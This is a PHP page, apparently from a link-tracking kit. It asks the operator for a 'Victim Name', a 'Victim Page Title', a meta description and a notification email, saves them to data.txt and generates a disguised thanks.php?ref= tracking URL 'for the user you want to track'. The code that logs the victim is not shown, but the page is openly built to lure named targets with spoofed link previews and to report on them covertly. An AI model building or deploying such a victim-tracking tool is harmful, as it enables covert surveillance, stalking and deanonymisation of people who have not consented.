<?php
session_start(); // Start the session to check if the user is activated

// If the user is not activated, redirect them to the activation page
if (!isset($_SESSION['activated']) || $_SESSION['activated'] !== true) {
    header("Location: index.php"); // Redirect to the activation page if not activated
    exit();
}

$showUrl = false; // Flag to control whether to show the tracking URL

// Initialize variables
$username = '';
$pageTitle = '';
$pageDescription = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ref = uniqid('ref_'); // Generate a unique reference ID
    $username = $_POST['username']; // Get the username input
    $pageTitle = $_POST['title']; // Get the page title
    $pageDescription = $_POST['description']; // Get the page description

    // In email.php, update the data storage line to:
    $line = "$email|$ip|$ref|$username|$pageTitle|$pageDescription\n";
    file_put_contents("data.txt", $line, FILE_APPEND);

    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";
    $domain = $_SERVER['HTTP_HOST']; // Gets the current domain
    $url = "{$protocol}{$domain}/thanks.php?ref=$ref";

    // Set the flag to show the URL
    $showUrl = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="<?php echo htmlspecialchars($pageDescription); ?>"> <!-- Meta description -->
    <meta name="title" content="<?php echo htmlspecialchars($pageTitle); ?>"> <!-- Meta title -->
    <title><?php echo htmlspecialchars($pageTitle); ?></title> <!-- Title of the page -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans flex justify-center items-center min-h-screen">

    <div class="bg-white p-8 rounded-lg shadow-lg max-w-lg w-full">
        <?php if (!$showUrl): ?>
        <h2 class="text-3xl font-semibold text-center text-gray-800 mb-6">Enter Information</h2>

        <form method="POST" class="space-y-6">
            <div>
                <label for="username" class="block text-sm text-gray-600 mb-2">Enter Victim Name:</label>
                <input type="text" name="username" value="<?php echo htmlspecialchars($username); ?>" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500" required />
            </div>

            <div>
                <label for="title" class="block text-sm text-gray-600 mb-2">Victim Page Title:</label>
                <input type="text" name="title" value="<?php echo htmlspecialchars($pageTitle); ?>" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500" required />
            </div>

            <div>
                <label for="description" class="block text-sm text-gray-600 mb-2">Victim Page Meta Description:</label>
                <input type="text" name="description" value="<?php echo htmlspecialchars($pageDescription); ?>" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500" required />
            </div>

            <div>
                <label for="email" class="block text-sm text-gray-600 mb-2">Receiving Email (Where you will be notified):</label>
                <input type="email" name="email" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500" required />
            </div>

            <button type="submit" class="w-full py-2 px-4 bg-green-500 text-white rounded-md hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">Generate Tracking Link</button>
        </form>
        <?php endif; ?>

        <?php if ($showUrl): ?>
        <div class="mt-6 text-center">
            <h3 class="text-xl font-semibold text-gray-800 mb-4">Your Tracking URL (For the user you want to track):</h3>
            <input type="text" value="<?php echo $url; ?>" readonly class="w-full px-4 py-2 border border-gray-300 rounded-md bg-gray-50 mb-4 text-gray-600" />
            <button onclick="copyToClipboard()" class="py-2 px-4 bg-blue-500 text-white rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">Copy Link</button>
        </div>
        <?php endif; ?>
    </div>

    <script>
        function copyToClipboard() {
            var copyText = document.querySelector('input');
            copyText.select();
            copyText.setSelectionRange(0, 99999); // For mobile devices
            document.execCommand('copy');
            alert("Copied the link: " + copyText.value);
        }
    </script>

</body>
</html>

